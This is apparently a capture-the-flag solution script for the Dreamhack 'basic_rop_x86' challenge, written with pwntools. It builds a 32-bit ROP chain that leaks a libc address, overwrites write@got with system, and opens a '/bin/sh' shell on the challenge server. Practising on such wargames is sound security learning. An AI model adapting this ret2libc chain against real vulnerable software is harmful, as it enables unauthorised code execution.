from os import lseek
from pwn import *

def slog(n,m):
    return success(":".join([n,hex(m)]))

# [0] settings
p = remote("host3.dreamhack.games", 11112)
e = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")
r = ROP(e)
context.arch = 'i386'
context.log_level = 'debug'


# [1] address
puts_plt = 0x8048420
puts_got = 0x804a018
read_plt = 0x80483f0
read_got = 0x804a00c
write_plt = 0x8048450
write_got = 0x804a024
pppr = 0x8048689   # ROPgadget --binary basic_rop_x86 | grep "pop"
bss = 0x804a040    # gdb-peda, elfheader


# [2] Leak the write@got address
buffer = b"A"*0x40 + b"B"*0x4 + b"C"*0x4
# write(1, read_got, 4)
payload = buffer + p32(write_plt) + p32(pppr) + p32(1) + p32(read_got) + p32(4)


# [3] Input the string in BSS and Overwrite the write@got with 
# read(0, bss, 8)
payload += p32(read_plt) + p32(pppr) + p32(0) + p32(bss) + p32(8)
# read(0, write_got, 4)
payload += p32(read_plt) + p32(pppr) + p32(0) + p32(write_got) + p32(4)
# write(bss)
payload += p32(write_plt) + p32(0) + p32(bss)

p.send(payload)
p.recvuntil("A"*0x40)

read_addr = u32(p.recvn(4))
slog("read address", read_addr)
libc_base = read_addr - libc.symbols["read"]
slog("libc_base address", libc_base)
system_addr = libc_base + libc.symbols["system"]
slog("system address", system_addr)

#p.send(payload2)
p.send(b"/bin/sh\x00")
p.sendline(p32(system_addr))


# [4] Get shell
p.interactive()











